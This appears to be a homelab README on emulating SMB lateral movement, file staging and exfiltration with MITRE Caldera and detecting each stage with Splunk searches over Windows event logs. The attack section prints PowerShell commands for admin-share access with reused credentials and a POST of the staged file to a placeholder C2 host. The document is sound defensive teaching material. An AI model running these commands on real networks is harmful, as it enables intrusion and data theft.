# SMB Lateral Movement & Data Exfiltration

**End-to-end kill-chain emulation and detection engineering in a self-built SOC homelab.**

Emulated a full attack chain — lateral movement → data staging → exfiltration — using MITRE Caldera, then built behavior-based detections for each stage in Splunk from Windows Security logs and Suricata. Every detection is mapped to MITRE ATT&CK and validated against live attack telemetry.

> **For reviewers:** the attack is the easy part. The value here is the detection engineering — catching each stage by *behavior* rather than indicator, and choosing host telemetry over network signatures where it's more reliable.

---

## Objective

Move laterally over SMB using reused credentials, stage a sensitive file with PowerShell, exfiltrate it over a C2 channel — and detect every stage in Splunk.

| Stage | Technique | ATT&CK ID |
|-------|-----------|-----------|
| Lateral Movement | SMB / Windows Admin Shares | T1021.002 |
| Collection | Data Staged: Local Data Staging | T1074.001 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |

---

## Lab Architecture

| Zone | Host | Role |
|------|------|------|
| Public | Kali | Attacker workstation + Caldera C2 server (`:8888`) |
| Perimeter | pfSense + Suricata | Firewall / inline IDS |
| Private | DC (`x.x.x.250`) | Active Directory Domain Controller — **lateral-movement target** |
| Private | Win10 Client (`x.x.x.252`) | Domain workstation — **attack origin** |
| Private | Splunk | SIEM (indexer + search head) |
| Infra | ESXi | Hypervisor |

**Movement direction:** Win10 Client → DC. A workstation pivoting *into* a domain controller is the realistic, high-value attack path — admin-share access on a DC means the attacker already holds domain-level privileges.

**Telemetry:** Windows hosts ship Security logs to Splunk via Universal Forwarders; pfSense ships Suricata EVE JSON.

---

## Phase 0 — Setup (Prerequisites)

These audit policies are **off by default**. Without them the events never generate and the detections return nothing — this is the #1 reason a lab "produces no data."

**On both the DC and the Client** — `gpedit.msc` → Computer Config → Windows Settings → Security Settings → Advanced Audit Policy:

| Subcategory | Setting | Generates |
|-------------|---------|-----------|
| Object Access → Audit File Share | Success | `5140` |
| Object Access → Audit Detailed File Share | Success | `5145` |
| Detailed Tracking → Audit Process Creation | Success | `4688` |

Also enable: Admin Templates → System → Audit Process Creation → **"Include command line in process creation events"** (or `4688` logs a blank command line). Then `gpupdate /force`.

**Confirm telemetry reaches Splunk before attacking:**

```spl
index=windows EventCode=4624 | head 5
index=suricata | head 5
```

---

<img width="1216" height="1036" alt="image" src="https://github.com/user-attachments/assets/38132a6d-5387-42d6-af03-340b7b560c22" />


## The Attack — MITRE Caldera

The chain is built as three Caldera **abilities**, sequenced into one **adversary profile**, then run as a single **operation** so the whole chain shares correlated timestamps.

> An *ability* is a single attack action performed on an agent. Agents (Sandcat) are deployed on the hosts and beacon back to the Caldera C2 on Kali.

<img width="1897" height="905" alt="image" src="https://github.com/user-attachments/assets/9b5e93c8-b616-4d20-932a-00596242730c" />

### Ability 1 — Lateral Movement (T1021.002)
Maps the DC's `ADMIN$` share from the client using reused domain credentials.

```powershell
net use \\<DC_IP>\ADMIN$ /user:LAB\Administrator <password>
```
<img width="1161" height="745" alt="image" src="https://github.com/user-attachments/assets/5f1c47cd-1e6e-4c4e-b77f-d2dd82a62e0c" />
<img width="1104" height="722" alt="image" src="https://github.com/user-attachments/assets/2ac5b2a6-f5ab-422c-ba4c-7ea0af449150" />


### Ability 2 — Data Staging (T1074.001)
Writes a decoy file onto the DC across the admin share.

```powershell
Set-Content -Path \\<DC_IP>\C$\Users\Public\sensitive.txt -Value 'SSN 000-00-0000 CC 4111111111111111'
```
<img width="1122" height="737" alt="image" src="https://github.com/user-attachments/assets/505571dc-615d-4b8d-a0f8-4d46ccc92e6c" />
<img width="1111" height="732" alt="image" src="https://github.com/user-attachments/assets/0fe4371f-10a2-4c59-9667-2d430f32d2fe" />



### Ability 3 — Exfiltration (T1041)
Reads the staged file and sends it outbound to the C2.

```powershell
$f = Get-Content \\<DC_IP>\C$\Users\Public\sensitive.txt; Invoke-WebRequest -Uri http://<C2_IP>:8888/file/upload -Method POST -Body $f
```
<img width="1127" height="776" alt="image" src="https://github.com/user-attachments/assets/bf3e41cd-6fb1-4904-a990-8dcef4c8ec5a" />
<img width="1135" height="774" alt="image" src="https://github.com/user-attachments/assets/84e0f6ab-f375-4d32-a069-52ab7c03cbfb" />



### Profile + Operation
Abilities created and chained into a profile in order: **Lateral Movement → Stage Decoy → Exfil** (order matters — staging must create the file before exfil reads it).

<img width="1675" height="745" alt="image" src="https://github.com/user-attachments/assets/3ff33acf-5c7e-4d09-9731-b99fa88d99c0" />


**Operation result:** Lateral movement and staging succeeded. The exfil POST returned a `500` because Caldera's `/file/upload` endpoint expects multipart form-data, not a raw string body — but **the outbound request still left the host and crossed pfSense**, so it remains fully detectable. The blue-team objective is to detect the *attempt*, not to guarantee a clean upload.

<img width="1898" height="899" alt="image" src="https://github.com/user-attachments/assets/23a10a45-79b7-4c67-ae6a-904cbe36812f" />
<img width="1898" height="900" alt="image" src="https://github.com/user-attachments/assets/c56833fa-fb20-4ac5-bf6a-de7cca991bbe" />
<img width="1902" height="890" alt="image" src="https://github.com/user-attachments/assets/b15da28e-0329-4ff1-9df3-2f1709bde6db" />
<img width="1630" height="739" alt="image" src="https://github.com/user-attachments/assets/7a886afa-92eb-4bcb-85cc-0412f320361a" />
<img width="1647" height="493" alt="image" src="https://github.com/user-attachments/assets/508546ab-f589-404c-9448-1a32bf06e084" />


---

## Detection Engineering — Splunk

Written with **Splunk Core Certified User** SPL only — search terms, fields, `table`, `stats count`, `sort`. No `eval`, `join`, or subsearches. MITRE mapping lives in the saved-search name. (Splunk Free can't schedule alerts, so detections are saved as **reports**.)

### 1. Lateral Movement — `Lateral Movement - SMB ADMIN$ Access - T1021.002`
EventID `5140` fires whenever a network share is accessed. Filtering for the hidden `ADMIN$` share isolates SMB lateral movement.

```spl
index=* EventCode=5140 Source_Address="x.x.x.252" Account_Name=Admin* Share_Name="\\*\ADMIN$" ComputerName="WIN-...lab.local"
| stats count by Account_Name, Source_Address, ComputerName
```
> The `Source_Address`/`ComputerName` filters scope this to the lab. A production rule drops them to catch admin-share access from **any** workstation to **any** target.

<img width="1405" height="900" alt="image" src="https://github.com/user-attachments/assets/808e044e-3f9e-4758-b6a7-c0590746e17a" />
<img width="1386" height="893" alt="image" src="https://github.com/user-attachments/assets/c7cf121a-3df1-449d-a98c-49154c589c49" />


### 2. Data Staging — `Collection - Remote Admin Share File Write - T1074.001`
The attacker dropped `sensitive.txt` — but matching that filename would miss any other file. Instead, detect the **behavior**: a file being *written* to an admin share. `Access_Mask=0x2` (WriteData) only appears when a file is written to a `C$`/`ADMIN$` share, so this catches the staging regardless of filename.

```spl
index=* EventCode=5145 Access_Mask=0x2 Share_Name="\\*\C$"
| table _time, Account_Name, Source_Address, Relative_Target_Name, Share_Name
| sort _time
```
<img width="1389" height="887" alt="image" src="https://github.com/user-attachments/assets/2e76e204-7f1e-43d1-b4d1-4a1008e9f8d6" />


### 3. Data Exfiltration — `Exfiltration - PowerShell Outbound to C2 - T1041`
Detected from the **host** rather than the IDS. `4688` process creation for `powershell.exe` with `Invoke-WebRequest` in the command line catches the outbound transfer — and the command line reveals the full exfil command and destination C2 URL.

```spl
index=* EventCode=4688 New_Process_Name="*powershell.exe*" Process_Command_Line="*Invoke-WebRequest*"
| table _time, host, Account_Name, Process_Command_Line
| sort _time
```
> **Why host-based, not Suricata?** Relying solely on the IDS is fragile — encryption or a custom C2 can evade signatures. The PowerShell process + outbound request on the endpoint is a more reliable, portable signal. Broaden with `*Invoke-RestMethod*`, `*Net.WebClient*`, or `*curl*` for other egress methods.

<img width="1389" height="876" alt="image" src="https://github.com/user-attachments/assets/8c5053e5-61be-49af-a84c-f182e8bb7c21" />


> **Field-name note:** `Share_Name`, `Source_Address`, `Access_Mask`, etc. come from the Splunk Add-on for Windows — adjust if your extractions differ.

---

## Detection Engineering Notes (Design Decisions)

Two deliberate choices that make these detections resilient rather than brittle:

- **Behavior over indicator (staging).** Detecting `Access_Mask=0x2` on an admin share catches the *action* of staging a file. Matching the literal filename `sensitive.txt` would be trivially evaded by renaming. Indicators change; the technique doesn't.
- **Host over network (exfil).** Catching the PowerShell outbound request on the endpoint survives encryption and custom C2 channels that would slip past a signature-based IDS. The IDS is a useful second layer, not the primary detection.

---

## Results

| Detection | Technique | Source | Result |
|-----------|-----------|--------|--------|
| SMB ADMIN$ Access | T1021.002 | Windows `5140` | ✅ Detected |
| Remote Admin Share File Write | T1074.001 | Windows `5145` (Access_Mask 0x2) | ✅ Detected |
| PowerShell Outbound to C2 | T1041 | Windows `4688` | ✅ Detected |

All three stages were emulated via Caldera and independently detected in Splunk, each saved as a report and re-validated by re-running the operation.

<img width="1298" height="843" alt="image" src="https://github.com/user-attachments/assets/9b10f2dc-2d62-4265-aa06-951d67e9bf23" />

---

## Key Takeaways

- Built and detected a complete kill chain (lateral movement → staging → exfil) end to end.
- Wrote behavior-based detections that survive indicator changes and evasion.
- Demonstrated that a failed attack step (the exfil POST) is still detectable — what matters is the attempt crossing the wire.
- Kept all SPL at Core level: readable, maintainable, explainable line by line.

---

*Built in an isolated SOC homelab against dummy test data. All techniques mapped to MITRE ATT&CK.*
